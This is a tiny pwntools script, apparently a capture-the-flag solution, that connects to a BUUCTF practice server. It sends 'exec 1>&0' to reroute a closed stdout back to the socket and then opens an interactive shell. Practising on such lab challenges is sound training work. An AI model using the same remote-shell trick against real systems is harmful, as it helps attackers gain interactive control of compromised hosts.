from pwn import *

sh=remote("node5.buuoj.cn",25163)
sh.sendline(b"exec 1>&0")
sh.interactive()
